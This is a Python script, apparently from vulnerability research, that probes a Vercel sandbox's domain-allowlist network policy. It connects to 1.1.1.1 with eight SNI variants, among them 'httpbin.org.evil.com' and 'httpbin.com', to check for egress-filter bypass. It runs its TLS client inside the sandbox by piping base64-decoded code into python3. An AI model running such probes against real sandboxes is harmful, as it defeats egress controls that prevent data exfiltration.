# -*- coding: utf-8 -*-
"""SNI 变体矩阵: 域名白名单匹配逻辑绕过测试
custom allow httpbin.org 下, 连 1.1.1.1:443 用不同 SNI:
  S1 httpbin.org          基线 应代理成功
  S2 sub.httpbin.org      子域
  S3 httpbin.org.         尾点
  S4 httpbin.org.evil.com 后缀包含 (若代理 -> 任意域名 exfil!)
  S5 xhttpbin.org         前缀包含
  S6 httpbin.com          相似域名 (若代理 -> 白名单绕过)
  S7 HttpBin.Org          大小写
  S8 .httpbin.org         前导点
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

# 恢复 custom + allow httpbin.org
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

TLS_CODE = '''import socket, ssl, sys
sni = sys.argv[1]
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection(('1.1.1.1', 443), timeout=6), server_hostname=sni)
    s.sendall(('GET / HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\n\\r\\n' % sni).encode())
    d = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            d += chunk
        except Exception:
            break
    print('OK', repr(d[:250]))
except Exception as e:
    print('ERR', type(e).__name__, str(e)[:60])
'''

for sni, tag in [
    ('httpbin.org',           'S1-baseline'),
    ('sub.httpbin.org',       'S2-subdomain'),
    ('httpbin.org.',          'S3-trailing-dot'),
    ('httpbin.org.evil.com',  'S4-suffix-inject'),
    ('xhttpbin.org',          'S5-prefix-inject'),
    ('httpbin.com',           'S6-similar-domain'),
    ('HttpBin.Org',           'S7-case-mix'),
    ('.httpbin.org',          'S8-leading-dot'),
]:
    b64 = base64.b64encode(TLS_CODE.encode()).decode()
    sc = 'echo %s | base64 -d | python3 - %s' % (b64, sni)
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=40000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:250]), flush=True)

print('=== SNIVAR DONE ===', flush=True)
